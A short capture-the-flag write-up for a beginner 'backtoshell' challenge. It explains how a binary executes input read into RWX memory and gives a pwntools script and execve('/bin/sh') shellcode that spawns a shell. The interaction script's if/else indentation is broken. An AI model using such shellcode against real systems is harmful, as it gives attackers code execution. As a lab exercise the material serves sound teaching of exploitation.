This is an easy shellcode challenge, it presents this main:
```c
void main(void)

{
  code *shellcode;
  
  shellcode = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  read(0,shellcode,0x200);
  (*shellcode)(0,0,0,0,0,0);
  return;
}
```
as we can see it create a memory space that of 0x1000 bytes that is readable writable and executable.
Then reads directly in this memory area and call the memory area as a function.
We can inject in that memory area a shellcode and that will be executed!
Our aim is to create a shellcode that will spawn a shell.
First of all we create a script python to interact with the binary:
```python
from pwn import *

import time
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
exename="./backtoshell"
port=2015
if "REMOTE" not in args:
	r = process(exename)
	if "NOGDB" not in args:
		gdb.attach(r, """
			# b d
			c
			""")
	else:
	r = remote("bin.training.offdef.it", port)
r.interactive()
```

in GDB we can see that the when our input is called as a function the address to our input is in rax, so we can create a shellcode in this way:
```python
asm_code="""
mov rdi, rax
add rdi,16
mov rax, 0x3b
syscall
"""
shellcode=asm(asm_code)
```
the "add rdi 16" instruction is to make rdi point to "/bin/sh/\x00", that we will put just after the shellcode in our payload. 16 is just the size of the shellcode.
Mov rax 0x3b and syscall will make our machine execute execve.
at the end we will send the payload in this way:
```python
payload=shellcode+b"/bin/sh\x00"
r.sendline(payload)
```
